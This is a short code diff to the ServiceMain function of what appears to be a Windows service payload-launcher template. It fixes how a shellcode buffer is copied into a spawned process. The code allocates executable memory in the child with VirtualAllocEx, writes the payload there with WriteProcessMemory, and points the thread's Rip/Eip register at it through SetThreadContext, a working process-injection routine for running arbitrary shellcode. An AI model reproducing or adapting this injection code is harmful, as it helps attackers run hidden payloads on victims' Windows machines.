@@ -92,7 +92,8 @@ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
 	CONTEXT Context;
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
-	void *lpPayload = bPayload;
+	void *lpPayload = &bPayload;
+	void *lpPayloadDest = NULL;
 	unsigned int dwPayloadSize = SCSIZE;
 
 	#if BUILDMODE == 2
@@ -129,14 +130,14 @@ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
 
 			GetThreadContext( pi.hThread, &Context );
 
-			lpPayload = VirtualAllocEx( pi.hProcess, NULL, dwPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
-			if( lpPayload )
+			lpPayloadDest = VirtualAllocEx( pi.hProcess, NULL, dwPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+			if( lpPayloadDest )
 			{
-				WriteProcessMemory( pi.hProcess, lpPayload, &bPayload, dwPayloadSize, NULL );
+				WriteProcessMemory( pi.hProcess, lpPayloadDest, lpPayload, dwPayloadSize, NULL );
 	#ifdef _WIN64
-				Context.Rip = (ULONG_PTR)lpPayload;
+				Context.Rip = (ULONG_PTR)lpPayloadDest;
 	#else
-				Context.Eip = (ULONG_PTR)lpPayload;
+				Context.Eip = (ULONG_PTR)lpPayloadDest;
 	#endif
 				SetThreadContext( pi.hThread, &Context );
 			}
